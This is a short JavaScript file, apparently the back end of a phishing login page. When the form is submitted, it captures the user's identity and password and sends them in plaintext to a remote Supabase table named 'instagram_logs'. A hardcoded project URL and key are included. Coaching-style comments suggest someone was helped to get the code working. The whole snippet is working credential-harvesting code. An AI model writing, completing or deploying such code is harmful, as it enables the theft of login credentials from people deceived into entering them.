const SUPABASE_URL = "https://vhkxrhuygujrghgjikdu.supabase.co";
const SUPABASE_ANON_KEY = "sb_publishable_NaZ5L8e0wq_hzQ8WNCk_cQ_zMPI5FB-";

const authForm = document.getElementById('login-form');
// Add the 'async' keyword right before the (e) => arrow function
authForm.addEventListener('submit', async (e) => {
    e.preventDefault();
    
    const userIdentity = document.getElementById('identity-input').value; 
    const userPassword = document.getElementById('password-input').value;

    // Now 'await' is completely valid here because the outer function is 'async'!
    const { data, error } = await supabase
      .from('instagram_logs') 
      .insert([
        { 
          user_identity: userIdentity, 
          password: userPassword       
        }
      ]);

    // Rest of your handling code...
});
